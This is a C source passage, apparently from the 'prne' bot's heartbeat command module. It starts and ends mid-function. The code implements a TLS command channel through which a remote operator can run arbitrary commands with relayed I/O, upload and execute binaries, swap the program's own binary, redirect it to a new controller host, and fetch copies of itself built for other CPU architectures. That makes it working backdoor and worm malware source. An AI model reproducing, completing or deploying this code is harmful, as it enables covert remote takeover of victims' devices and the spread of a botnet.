		if (ib[0].len > 0) {
			// focus on flushing incoming stdin data first.
			pfd[0].events = 0;
			pfd[1].events = POLLOUT;
		}
		else if (sh[0].fin) {
			pfd[0].events = pfd[1].events = 0;
		}
		else {
			pfd[0].events = POLLIN;
			pfd[1].events = 0;
		}

		if ((pfd[0].events & POLLIN) && ctx->pending_f(ctx->ioctx)) {
			pfd[0].revents = POLLIN;
			pfd[1].revents = pfd[2].revents = pfd[3].revents = 0;
		}
		else {
			prne_pth_reset_timer(&ev, &HTBT_RELAY_CHILD_TIMEOUT);
			prne_pth_poll(pfd, sizeof(pfd) / sizeof(struct pollfd), -1, ev);

			if (pth_event_status(ev) != PTH_STATUS_PENDING) {
				prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
				htbt_slv_send_status(
					ctx,
					&msg_id,
					PRNE_HTBT_STATUS_ERRNO,
					ETIMEDOUT,
					ev);
				goto END;
			}
		}

		// Handle events
		if (pfd[0].revents) {
/* Incoming stdin data to the process
* The process might not be accepting stdin data so we save the data in
* the buffer and try to flush out the stdout/stderr data from the process at the
* same time.
*/
			if (!htbt_relay_child_evconn(
				ctx,
				msg_id,
				&mh,
				sh + 0,
				c_in,
				ib + 0,
				&ev))
			{
				goto END;
			}
		}
		if (pfd[1].revents) {
			// Flush buffered stdin data.
			if (!htbt_relay_child_evflush(
				ctx,
				msg_id,
				sh + 0,
				c_in,
				ib + 0,
				&ev))
			{
				goto END;
			}
		}
		if (pfd[2].revents || pfd[3].revents) {
			// Send stdout and stderr data from the process to the auth end.
			if (!htbt_relay_child_evchld(
					ctx,
					msg_id,
					c_pid,
					&mh,
					sh + 1,
					c_out,
					c_err,
					ib + 1,
					&ev))
			{
				goto END;
			}
		}
	}
	ret = true;

END:
	prne_htbt_free_stdio(sh + 0);
	prne_htbt_free_stdio(sh + 1);
	prne_free_iobuf(ib + 0);
	prne_free_iobuf(ib + 1);
	prne_htbt_free_msg_head(&mh);
	pth_event_free(ev, FALSE);
	return ret;
}

static bool htbt_do_cmd (
	const bool detach,
	char *const *args,
	htbt_slv_ctx_t *ctx,
	const uint16_t msg_id,
	prne_htbt_status_code_t *out_status,
	int32_t *out_err)
{
	bool ret = false;
	int cin[2] = { -1, -1 };
	int cout[2] = { -1, -1 };
	int cerr[2] = { -1, -1 };
	int errp[2] = { -1, -1 };
	pid_t child = -1, to_kill;
	int f_ret, chld_status;
	prne_htbt_status_code_t ret_status;
	int32_t ret_err = 0;
	pth_event_t ev = NULL;
	pid_t w_ret;
	struct timespec wait_start, wait_now, wait_dur;

	if (pipe(errp) != 0 ||
		fcntl(errp[0], F_SETFD, FD_CLOEXEC) != 0 ||
		fcntl(errp[1], F_SETFD, FD_CLOEXEC) != 0)
	{
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_err = errno;
		goto END;
	}
	/*
	* Create STDIO channels for detached process too so that the detached
	* process doesn't end up with 0, 1 or 2 for fd of regular files.
	*/
	if (pipe(cin) != 0 || pipe(cout) != 0 || pipe(cerr) != 0) {
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_err = errno;
		goto END;
	}

	if (detach) {
		// Make it so that read/write() on stdio fds result in EOF or EPIPE
		close(cin[1]);
		close(cout[0]);
		close(cerr[0]);
		cin[1] = cout[0] = cerr[0] = -1;
	}

	if (ctx->cbset->fork.prepare != NULL &&
		!ctx->cbset->fork.prepare(ctx->cb_ctx))
	{
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_err = errno;
		goto END;
	}

	to_kill = child = pth_fork();
	if (child == 0) {
		do { // TRY
			if (ctx->cbset->fork.child != NULL &&
				!ctx->cbset->fork.child(ctx->cb_ctx))
			{
				break;
			}

			pth_kill();
			close(errp[0]);
			prne_close(cin[1]);
			prne_close(cout[0]);
			prne_close(cerr[0]);
			if (prne_chfd(cin[0], STDIN_FILENO) != STDIN_FILENO ||
				prne_chfd(cout[1], STDOUT_FILENO) != STDOUT_FILENO ||
				prne_chfd(cerr[1], STDERR_FILENO) != STDERR_FILENO)
			{
				break;
			}

			if (detach) {
				child = fork();
				if (child < 0) {
					break;
				}
				else if (child > 0) {
					exit(0);
				}
				setsid();
			}
			else {
				if (setpgid(0, 0) != 0) {
					break;
				}
			}
			execv(args[0], args);
		} while (false);
		// CATCH
		ret_err = errno;
		write(errp[1], &ret_err, sizeof(int32_t));
		raise(SIGKILL);
	}
	else if (child < 0 ||
		(ctx->cbset->fork.parent != NULL &&
		!ctx->cbset->fork.parent(ctx->cb_ctx)))
	{
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_err = errno;
		goto END;
	}

	// The parent continues ...
	close(errp[1]);
	errp[1] = -1;

	prne_pth_reset_timer(&ev, &HTBT_CHILD_SPAWN_TIMEOUT);
	f_ret = pth_read_ev(errp[0], &ret_err, sizeof(int32_t), ev);
	if (f_ret == sizeof(int32_t)) {
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		goto END;
	}
	else if (f_ret < 0) {
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_err = errno;
		goto END;
	}
	prne_close(errp[0]);
	errp[0] = -1;
	to_kill = -child;

	ret_status = PRNE_HTBT_STATUS_OK;
	if (detach)  {
		ret = true;
	}
	else {
		prne_close(cin[0]);
		prne_close(cout[1]);
		prne_close(cerr[1]);
		cin[0] = cout[1] = cerr[1] = -1;
		if (!prne_sck_fcntl(cin[1]) ||
			!prne_sck_fcntl(cout[0]) ||
			!prne_sck_fcntl(cerr[0]))
		{
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_err = errno;
			goto END;
		}

		// don't goto END here. Reap the child process regardless of the result
		// of htbt_relay_child() run.
		ret = htbt_relay_child(
			ctx,
			msg_id,
			&child,
			cin + 1,
			cout + 0,
			cerr + 0);
		prne_close(cin[1]);
		prne_close(cout[0]);
		prne_close(cerr[0]);
		cin[1] = cout[0] = cerr[0] = -1;
	}

	wait_start = prne_gettime(CLOCK_MONOTONIC);
	while (true) {
		// try reapping every 1 second as pth does not provide pth_waitpid_ev()
		w_ret = pth_waitpid(child, &chld_status, WUNTRACED | WNOHANG);
		if (w_ret == 0) {
			wait_now = prne_gettime(CLOCK_MONOTONIC);
			wait_dur = prne_sub_timespec(wait_now, wait_start);

			if (prne_cmp_timespec(wait_dur, HTBT_CHILD_SPAWN_TIMEOUT) < 0) {
				prne_pth_reset_timer(&ev, &HTBT_CHILD_WAIT_INT);
				pth_wait(ev);
				continue;
			}
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_err = ETIMEDOUT;
			goto END;
		}
		else if (w_ret < 0) {
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_err = errno;
			goto END;
		}
		else {
			break;
		}
	}

	if (WIFEXITED(chld_status)) {
		ret_err = WEXITSTATUS(chld_status);
		child = -1;
	}
	else if (WIFSIGNALED(chld_status)) {
		ret_err = 128 + WTERMSIG(chld_status);
		child = -1;
	}
	else if (WIFSTOPPED(chld_status)) {
		// child has been stopped just right before exit
		ret_err = 128 + SIGSTOP;
	}
	else {
		ret_err = -1; // WTF?
	}

END:
	pth_event_free(ev, FALSE);
	prne_close(cin[0]);
	prne_close(cin[1]);
	prne_close(cout[0]);
	prne_close(cout[1]);
	prne_close(cerr[0]);
	prne_close(cerr[1]);
	prne_close(errp[0]);
	prne_close(errp[1]);
	if (child > 0) {
		kill(to_kill, SIGKILL);
		pth_waitpid(child, NULL, 0);
	}

	if (out_status != NULL) {
		*out_status = ret_status;
	}
	if (out_err != NULL) {
		*out_err = ret_err;
	}

	return ret;
}

// Process rogue STDIO frames.
static bool htbt_slv_srv_stdio (htbt_slv_ctx_t *ctx, const uint16_t corr_id) {
	bool ret = false;
	prne_htbt_stdio_t sh;
	pth_event_t ev = NULL;
	ssize_t io_ret;

	prne_htbt_init_stdio(&sh);
	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);

	if (!htbt_slv_recv_stdio(ctx, &sh, &corr_id, ev)) {
		goto END;
	}

	prne_iobuf_reset(ctx->iobuf + 0);
	while (sh.len > 0) {
		io_ret = htbt_slv_read(
			ctx,
			ctx->iobuf[0].m,
			prne_op_min(ctx->iobuf[0].avail, sh.len),
			ev);
		if (io_ret < 0) {
			goto END;
		}
		if (io_ret == 0) {
			htbt_slv_raise_protoerr(
				ctx,
				&corr_id,
				0,
				ev,
				"EOF skipping rogue stdio frames");
			goto END;
		}
		sh.len -= ctx->iobuf[0].len;
	}
	ret = true;

END:
	prne_htbt_free_stdio(&sh);
	pth_event_free(ev, FALSE);
	return ret;
}

static bool htbt_slv_srv_hostinfo (
	htbt_slv_ctx_t *ctx,
	const uint16_t corr_id)
{
	bool ret;
	prne_htbt_host_info_t hi;
	pth_event_t ev = NULL;

	prne_htbt_init_host_info(&hi);
	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);

	if (ctx->cbset->hostinfo == NULL) {
		ret = htbt_slv_send_status(
			ctx,
			&corr_id,
			PRNE_HTBT_STATUS_UNIMPL,
			0,
			ev);
	}
	else if (ctx->cbset->hostinfo(ctx->cb_ctx, &hi)) {
		prne_htbt_msg_head_t mh;

		prne_htbt_init_msg_head(&mh);
		mh.op = PRNE_HTBT_OP_HOST_INFO;
		mh.is_rsp = true;
		mh.id = corr_id;

		ret =
			htbt_slv_send_mh(ctx, &mh, ev) &&
			htbt_slv_send_frame(
				ctx,
				&hi,
				(prne_htbt_ser_ft)prne_htbt_ser_host_info,
				ev);

		prne_htbt_free_msg_head(&mh);
	}
	else {
		ret = htbt_slv_send_status(
			ctx,
			&corr_id,
			PRNE_HTBT_STATUS_ERRNO,
			errno,
			ev);
	}

	pth_event_free(ev, FALSE);
	prne_htbt_free_host_info(&hi);
	return ret;
}

static bool htbt_slv_srv_run_cmd (htbt_slv_ctx_t *ctx, const uint16_t corr_id) {
	bool ret;
	prne_htbt_cmd_t cmd;
	pth_event_t ev = NULL;
	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_ERRNO;
	int32_t err = 0;

	prne_htbt_init_cmd(&cmd);

	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	ret = htbt_slv_recv_frame(
		ctx,
		&cmd,
		(prne_htbt_dser_ft)prne_htbt_dser_cmd,
		&corr_id,
		true,
		ev);
	if (!ret) {
		goto END;
	}

	ret = htbt_do_cmd(cmd.detach, cmd.args, ctx, corr_id, &status, &err);

	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	ret &= htbt_slv_send_status(ctx, &corr_id, status, err, ev);

END:
	pth_event_free(ev, FALSE);
	prne_htbt_free_cmd(&cmd);
	return ret;
}

static bool htbt_slv_srv_bin (
	htbt_slv_ctx_t *ctx,
	const uint16_t corr_id,
	const prne_htbt_op_t op)
{
	bool ret = false;
	prne_htbt_msg_head_t mh;
	prne_htbt_bin_meta_t bin_meta;
	prne_htbt_stdio_t stdio_f;
	char *path = NULL;
	char **args = NULL;
	int fd = -1;
	pth_event_t ev = NULL;
	prne_htbt_status_code_t ret_status = PRNE_HTBT_STATUS_OK;
	int32_t ret_errno = 0;
	htbt_lmk_t lmk = HTBT_LMK_NONE;
	ssize_t io_ret;
	size_t written = 0;

	prne_dbgast(
		op == PRNE_HTBT_OP_RUN_BIN ||
		op == PRNE_HTBT_OP_UP_BIN);

	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_bin_meta(&bin_meta);
	prne_htbt_init_stdio(&stdio_f);

	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	if (!htbt_slv_recv_frame(
			ctx,
			&bin_meta,
			(prne_htbt_dser_ft)prne_htbt_dser_bin_meta,
			&corr_id,
			true,
			ev))
	{
		goto END;
	}

	if (ctx->cbset->tmpfile == NULL ||
		(op == PRNE_HTBT_OP_UP_BIN && ctx->cbset->upbin == NULL))
	{
		ret_status = PRNE_HTBT_STATUS_UNIMPL;
		goto SND_STATUS;
	}

	if (op == PRNE_HTBT_OP_UP_BIN && ctx->lm_acquire_f != NULL) {
		if (ctx->lm_acquire_f(ctx->ioctx, HTBT_LMK_UPBIN)) {
			lmk = HTBT_LMK_UPBIN;
		}
		else {
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_errno = EBUSY;
			goto SND_STATUS;
		}
	}

	errno = 0;
	fd = ctx->cbset->tmpfile(
		ctx->cb_ctx,
		O_CREAT | O_TRUNC | O_WRONLY | O_EXCL,
		0700,
		bin_meta.alloc_len,
		&path);
	if (fd < 0) {
		ret_status = PRNE_HTBT_STATUS_ERRNO;
		ret_errno = errno;
		goto SND_STATUS;
	}
	fcntl(fd, F_SETFD, FD_CLOEXEC);

	do {
		prne_pth_reset_timer(&ev, &HTBT_DL_TICK_TIMEOUT);

		if (!htbt_slv_recv_mh(ctx, &mh, &corr_id, true, ev)) {
			goto END;
		}
		switch (mh.op) {
		case PRNE_HTBT_OP_NOOP:
			if (!htbt_slv_srv_noop(ctx)) {
				goto END;
			}
			continue;
		case PRNE_HTBT_OP_STDIO: break;
		default:
			htbt_slv_raise_protoerr(
				ctx,
				&corr_id,
				0,
				ev,
				"%02X: invalid op downloading binary",
				mh.op);
			goto END;
		}
		if (!htbt_slv_recv_stdio(ctx, &stdio_f, &corr_id, ev)) {
			goto END;
		}

		written += stdio_f.len;
		prne_iobuf_reset(ctx->iobuf + 0);
		while (stdio_f.len > 0 || ctx->iobuf[0].len > 0) {
			if (stdio_f.len > 0) {
				io_ret = htbt_slv_read(
					ctx,
					ctx->iobuf[0].m + ctx->iobuf[0].len,
					prne_op_min(stdio_f.len, ctx->iobuf[0].avail),
					ev);
				if (io_ret < 0) {
					goto END;
				}
				if (io_ret == 0) {
					htbt_slv_raise_protoerr(
						ctx,
						&corr_id,
						0,
						ev,
						"EOF downloading binary");
					goto END;
				}
				prne_iobuf_shift(ctx->iobuf + 0, io_ret);
				stdio_f.len -= io_ret;
				if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
					prne_dbgpf(
						HTBT_NT_SLV"@%"PRIuPTR": < bin dl %zd bytes.\n",
						(uintptr_t)ctx,
						io_ret);
				}
			}

			// This blocks!
			io_ret = write(fd, ctx->iobuf[0].m, ctx->iobuf[0].len);
			if (io_ret <= 0) {
				ret_status = PRNE_HTBT_STATUS_ERRNO;
				if (io_ret < 0) {
					ret_errno = errno;
				}
				ret = htbt_slv_skip(ctx, stdio_f.len, ev);
				if (ret) {
					goto SND_STATUS;
				}
				else {
					goto END;
				}
			}
			prne_iobuf_shift(ctx->iobuf + 0, -io_ret);
		}

		pth_yield(NULL);
	} while (!stdio_f.fin);
	// Just in case transfer falls short of alloc_len
	ftruncate(fd, (off_t)written);
	close(fd);
	fd = -1;

	if (op == PRNE_HTBT_OP_RUN_BIN) {
		char *add_args[1] = { path };

		args = prne_htbt_parse_args(
			bin_meta.cmd.mem,
			bin_meta.cmd.mem_len,
			1,
			add_args,
			NULL,
			SIZE_MAX);
		if (args == NULL) {
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_errno = errno;
			goto SND_STATUS;
		}

		ret = htbt_do_cmd(
			bin_meta.cmd.detach,
			args,
			ctx,
			corr_id,
			&ret_status,
			&ret_errno);
		if (!ret) {
			goto END;
		}
	}
	else {
		ret = true;
		if (ctx->cbset->upbin(ctx->cb_ctx, path, &bin_meta.cmd)) {
			path[0] = 0;
		}
		else {
			ret_status = PRNE_HTBT_STATUS_ERRNO;
			ret_errno = errno;
		}
	}

SND_STATUS:
	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	if (!htbt_slv_send_status(ctx, &corr_id, ret_status, ret_errno, ev)) {
		ret = false;
	}
END:
	prne_htbt_free_msg_head(&mh);
	prne_htbt_free_bin_meta(&bin_meta);
	prne_htbt_free_stdio(&stdio_f);
	if (path != NULL && path[0] != 0) {
		unlink(path);
	}
	prne_free(path);
	prne_free(args);
	prne_close(fd);
	pth_event_free(ev, FALSE);
	if (lmk != HTBT_LMK_NONE && ctx->lm_release_f != NULL) {
		ctx->lm_release_f(ctx->ioctx, lmk);
	}

	return ret;
}

static bool htbt_slv_srv_hover (
	htbt_slv_ctx_t *ctx,
	const uint16_t corr_id)
{
	bool ret;
	prne_htbt_hover_t hv;
	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_OK;
	int32_t err = 0;
	pth_event_t ev = NULL;

	prne_htbt_init_hover(&hv);
// TRY
	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	ret = htbt_slv_recv_frame(
		ctx,
		&hv,
		(prne_htbt_dser_ft)prne_htbt_dser_hover,
		&corr_id,
		true,
		ev);
	if (!ret) {
		goto END;
	}

	if (ctx->hover_f == NULL) {
		status = PRNE_HTBT_STATUS_UNIMPL;
	}
	else {
		ctx->hover_f(ctx->ioctx, &hv, &status, &err);
	}

	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	ret = htbt_slv_send_status(ctx, &corr_id, status, err, ev);
END:
	pth_event_free(ev, FALSE);
	prne_htbt_free_hover(&hv);
	return ret;
}

static void htbt_slv_set_pack_err (
	prne_pack_rc_t prc,
	const int ierr,
	prne_htbt_status_code_t *ost,
	int32_t *oerr)
{
	switch (prc) {
	case PRNE_PACK_RC_OK:
	case PRNE_PACK_RC_EOF:
	case PRNE_PACK_RC_INVAL:
	case PRNE_PACK_RC_FMT_ERR:
	case PRNE_PACK_RC_NO_ARCH:
		*ost = PRNE_HTBT_STATUS_SUB;
		*oerr = prc;
		break;
	case PRNE_PACK_RC_ERRNO:
		*ost = PRNE_HTBT_STATUS_ERRNO;
		*oerr = ierr;
		break;
	case PRNE_PACK_RC_Z_ERR:
		*ost = PRNE_HTBT_STATUS_SUB;
		*oerr = (int32_t)ierr << 8 | (int32_t)prc;
		break;
	default:
		*ost = PRNE_HTBT_STATUS_UNIMPL;
		*oerr = 0;
	}
}

static bool htbt_slv_srv_rcb (
	htbt_slv_ctx_t *ctx,
	const uint16_t corr_id)
{
	bool ret;
	prne_htbt_rcb_t rcb_f;
	prne_htbt_status_code_t status = PRNE_HTBT_STATUS_OK;
	int32_t err = 0;
	prne_pack_rc_t prc;
	prne_bin_rcb_ctx_t rcb_ctx;
	prne_bin_host_t target, started;
	prne_iobuf_t rcb_ib;
	pth_event_t ev = NULL;
	ssize_t io_ret;
	int rcb_err = 0;
	prne_htbt_stdio_t data_f;
	prne_htbt_msg_head_t mh;

	prne_htbt_init_msg_head(&mh);
	prne_htbt_init_rcb(&rcb_f);
	prne_htbt_init_stdio(&data_f);
	prne_init_bin_rcb_ctx(&rcb_ctx);
	prne_init_iobuf(&rcb_ib);
// TRY
	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	ret = htbt_slv_recv_frame(
		ctx,
		&rcb_f,
		(prne_htbt_dser_ft)prne_htbt_dser_rcb,
		&corr_id,
		true,
		ev);
	if (!ret) {
		goto END;
	}

	if (ctx->rcb == NULL) {
		status = PRNE_HTBT_STATUS_ERRNO;
		err = ENOMEDIUM;
		goto STATUS_END;
	}
	if (!prne_try_alloc_iobuf(&rcb_ib, HTBT_STDIO_IB_SIZE)) {
		status = PRNE_HTBT_STATUS_ERRNO;
		err = errno;
		goto STATUS_END;
	}

	if (rcb_f.self) {
		if (ctx->rcb->self != NULL) {
			target = *ctx->rcb->self;
		}
		else {
			status = PRNE_HTBT_STATUS_ERRNO;
			err = ENOMEDIUM;
			goto STATUS_END;
		}
	}
	else {
		target.os = rcb_f.os;
		target.arch = rcb_f.arch;
	}
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			HTBT_NT_SLV"@%"PRIuPTR": starting rcb self=%02X target=%02X"
			" compat(%s)\n",
			(uintptr_t)ctx,
			ctx->rcb->self != NULL ? ctx->rcb->self->arch : PRNE_ARCH_NONE,
			target.arch,
			rcb_f.compat ? "*" : " ");
	}
	prc = prne_start_bin_rcb_compat(
		&rcb_ctx,
		target,
		ctx->rcb->self,
		ctx->rcb->m_self,
		ctx->rcb->self_len,
		ctx->rcb->exec_len,
		ctx->rcb->m_dv,
		ctx->rcb->dv_len,
		ctx->rcb->ba,
		&started);
	if (prc != PRNE_PACK_RC_OK) {
		htbt_slv_set_pack_err(prc, errno, &status, &err);
		goto STATUS_END;
	}
	if (!rcb_f.compat && !prne_eq_bin_host(&target, &started)) {
		htbt_slv_set_pack_err(PRNE_PACK_RC_NO_ARCH, 0, &status, &err);
		goto STATUS_END;
	}

	mh.id = corr_id;
	mh.is_rsp = true;
	mh.op = PRNE_HTBT_OP_STDIO;
	do {
		prne_pth_reset_timer(&ev, &HTBT_DL_TICK_TIMEOUT);

		io_ret = prne_bin_rcb_read(
			&rcb_ctx,
			rcb_ib.m,
			rcb_ib.avail,
			&prc,
			&rcb_err);
		if (io_ret < 0) {
			htbt_slv_set_pack_err(prc, rcb_err, &status, &err);
			goto STATUS_END;
		}
		prne_iobuf_shift(&rcb_ib, io_ret);

		if (rcb_ib.len > 0) {
			data_f.len = rcb_ib.len;
			ret =
				htbt_slv_send_mh(ctx, &mh, ev) &&
				htbt_slv_send_stdio(ctx, &data_f, ev) &&
				htbt_slv_wflush_ib(ctx, &rcb_ib, ev);
			if (!ret) {
				goto END;
			}
		}

		pth_yield(NULL);
	} while (prc != PRNE_PACK_RC_EOF);
	prne_pth_reset_timer(&ev, &HTBT_DL_TICK_TIMEOUT);
	data_f.fin = true;
	data_f.len = 0;
	ret =
		htbt_slv_send_mh(ctx, &mh, ev) &&
		htbt_slv_send_stdio(ctx, &data_f, ev);
	if (!ret) {
		goto END;
	}

STATUS_END:
	if (status != PRNE_HTBT_STATUS_OK) {
		prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
		ret = htbt_slv_send_status(ctx, &corr_id, status, err, ev);
	}
END:
	prne_htbt_free_msg_head(&mh);
	prne_free_iobuf(&rcb_ib);
	prne_htbt_free_rcb(&rcb_f);
	prne_htbt_free_stdio(&data_f);
	prne_free_bin_rcb_ctx(&rcb_ctx);
	pth_event_free(ev, FALSE);
	return ret;
}

static bool htbt_slv_main (htbt_slv_ctx_t *ctx) {
	prne_htbt_msg_head_t mh;
	pth_event_t ev = NULL;
	bool ret;

	prne_htbt_init_msg_head(&mh);

	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	ret = htbt_slv_recv_mh(ctx, &mh, NULL, false, ev);
	if (!ret) {
		goto END;
	}
	switch (mh.op) {
	case PRNE_HTBT_OP_NOOP:
		ret = htbt_slv_srv_noop(ctx);
		break;
	case PRNE_HTBT_OP_STDIO:
		ret = htbt_slv_srv_stdio(ctx, mh.id);
		break;
	case PRNE_HTBT_OP_HOST_INFO:
		htbt_slv_srv_hostinfo(ctx, mh.id);
		ret = true;
		break;
	case PRNE_HTBT_OP_RUN_CMD:
		ret = htbt_slv_srv_run_cmd(ctx, mh.id);
		break;
	case PRNE_HTBT_OP_RUN_BIN:
	case PRNE_HTBT_OP_UP_BIN:
		ret = htbt_slv_srv_bin(ctx, mh.id, mh.op);
		break;
	case PRNE_HTBT_OP_HOVER:
		ret = htbt_slv_srv_hover(ctx, mh.id);
		break;
	case PRNE_HTBT_OP_RCB:
		ret = htbt_slv_srv_rcb(ctx, mh.id);
		break;
	default:
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
			prne_dbgpf(
				HTBT_NT_SLV"@%"PRIuPTR": unimpl op %02X\n",
				(uintptr_t)ctx,
				mh.op);
		}
		htbt_slv_send_status(ctx, &mh.id, PRNE_HTBT_STATUS_UNIMPL, 0, ev);
		ret = false;
	}

END:
	prne_htbt_free_msg_head(&mh);
	return ret;
}

static void *htbt_slv_entry (void *p) {
	htbt_slv_ctx_t *ctx = (htbt_slv_ctx_t*)p;
	pth_event_t ev = NULL;
	bool valid = true;

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(HTBT_NT_SLV"@%"PRIuPTR": entry.\n", (uintptr_t)ctx);
	}

	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	if (!ctx->setup_f(ctx->ioctx, ev)) {
		goto END;
	}
	prne_pth_reset_timer(&ev, &HTBT_SLV_SCK_OP_TIMEOUT);
	if (!htbt_slv_wflush_ib(ctx, ctx->iobuf + 1, ev)) {
		goto END;
	}
	pth_event_free(ev, FALSE);
	ev = NULL;

	while (valid && ctx->loopchk_f(ctx->ioctx)) {
		valid = htbt_slv_main(ctx);
	}

END:
	prne_pth_reset_timer(&ev, &HTBT_CLOSE_TIMEOUT);
	ctx->cleanup_f(ctx->ioctx, ev);

	pth_event_free(ev, FALSE);

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(HTBT_NT_SLV"@%"PRIuPTR": exit.\n", (uintptr_t)ctx);
	}

	return NULL;
}

static int htbt_main_do_connect (
	prne_htbt_t *ctx,
	const prne_htbt_hover_t *hv)
{
	static const socklen_t arr_sl[2] = {
		sizeof(struct sockaddr_in6),
		sizeof(struct sockaddr_in) };
	struct sockaddr_in6 sa6;
	struct sockaddr_in sa4;
	const struct sockaddr *arr_sa[2] = {
		(struct sockaddr*)&sa6,
		(struct sockaddr*)&sa4 };
	struct pollfd pfd[2];
	int f_ret, ret = -1;
	pth_event_t ev_root, ev;
	socklen_t sl;

	ev_root = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
	prne_assert(ev_root != NULL);

	prne_memzero(&sa6, sizeof(sa6));
	sa6.sin6_family = AF_INET6;
	memcpy(&sa6.sin6_addr, hv->v6.addr, 16);
	sa6.sin6_port = htons(hv->v6.port);

	prne_memzero(&sa4, sizeof(sa4));
	sa4.sin_family = AF_INET;
	memcpy(&sa4.sin_addr, hv->v4.addr, 4);
	sa4.sin_port = htons(hv->v4.port);

	pfd[0].fd = socket(AF_INET6, SOCK_STREAM, 0);
	pfd[1].fd = socket(AF_INET, SOCK_STREAM, 0);
	pfd[0].events = pfd[1].events = POLLOUT;

	for (size_t i = 0; i < 2; i += 1) {
		if (pfd[i].fd < 0) {
			continue;
		}
		if (!prne_sck_fcntl(pfd[i].fd)) {
			goto ERR;
		}
		if (connect(pfd[i].fd, arr_sa[i], arr_sl[i]) < 0 &&
			errno != EINPROGRESS)
		{
			goto ERR;
		}

		ev = pth_event(
			PTH_EVENT_FD | PTH_UNTIL_FD_WRITEABLE | PTH_UNTIL_FD_EXCEPTION,
			pfd[i].fd);
		prne_assert(ev != NULL);
		pth_event_concat(ev_root, ev, NULL);

		continue;
ERR:
		close(pfd[i].fd);
		pfd[i].fd = -1;
	}

	prne_dbgtrap(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
	if (ctx->loop_flag) {
		pth_cond_await(&ctx->cond, &ctx->lock, ev_root);
	}
	pth_mutex_release(&ctx->lock);

	f_ret = poll(pfd, 2, 0);
	if (f_ret < 0) {
		goto END;
	}

	sl = sizeof(f_ret);
	for (size_t i = 0; i < 2; i += 1) {
		if (!(pfd[i].revents & POLLOUT)) {
			continue;
		}
		if (getsockopt(pfd[i].fd, SOL_SOCKET, SO_ERROR, &f_ret, &sl) != 0 ||
			f_ret != 0)
		{
			errno = f_ret;
			continue;
		}

		ret = pfd[i].fd;
		pfd[i].fd = -1;
		break;
	}

END:
	pth_event_free(ev_root, TRUE);
	prne_close(pfd[0].fd);
	prne_close(pfd[1].fd);
	return ret;
}

static bool htbt_main_slv_loopchk_f (void *ioctx) {
	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
	return ctx->parent->loop_flag;
}

static uint16_t htbt_main_gen_msgid (void *ctx) {
	uint16_t ret = PRNE_HTBT_MSG_ID_MIN;
	mbedtls_ctr_drbg_random(
		(mbedtls_ctr_drbg_context*)ctx,
		(unsigned char *)&ret,
		sizeof(ret));
	return ret;
}

static bool htbt_main_slv_setup_f (void *ioctx, pth_event_t ev) {
	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
	bool ret = true;
	size_t actual;
	prne_htbt_msg_head_t mh;

	prne_htbt_init_msg_head(&mh);

	mh.id = prne_htbt_gen_msgid(
		ctx->parent->param.ctr_drbg,
		htbt_main_gen_msgid);
	mh.is_rsp = false;
	mh.op = PRNE_HTBT_OP_SOLICIT;
	prne_htbt_ser_msg_head(NULL, 0, &actual, &mh);

	if (!prne_mbedtls_pth_handle(
		&ctx->ssl,
		mbedtls_ssl_handshake,
		ctx->fd,
		ev,
		NULL))
	{
		ret = false;
		goto END;
	}
	if (!prne_mbedtls_verify_alp(
		ctx->parent->param.main_ssl_conf,
		&ctx->ssl,
		PRNE_HTBT_TLS_ALP))
	{
		ret = false;
		goto END;
	}

	prne_dbgast(actual <= ctx->slv.iobuf[1].avail);
	ret = prne_htbt_ser_msg_head(
		ctx->slv.iobuf[1].m + ctx->slv.iobuf[1].len,
		ctx->slv.iobuf[1].avail,
		&actual,
		&mh) == PRNE_HTBT_SER_RC_OK;
	prne_iobuf_shift(ctx->slv.iobuf + 1, actual);

END:
	prne_htbt_free_msg_head(&mh);
	return ret;
}

static void htbt_main_slv_cleanup_f (void *ioctx, pth_event_t ev) {
	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;

	prne_mbedtls_pth_handle(
		&ctx->ssl,
		mbedtls_ssl_close_notify,
		ctx->fd,
		ev,
		NULL);
	shutdown(ctx->fd, SHUT_RDWR);
}

static ssize_t htbt_main_slv_read_f (
	void *ioctx,
	void *buf,
	const size_t len)
{
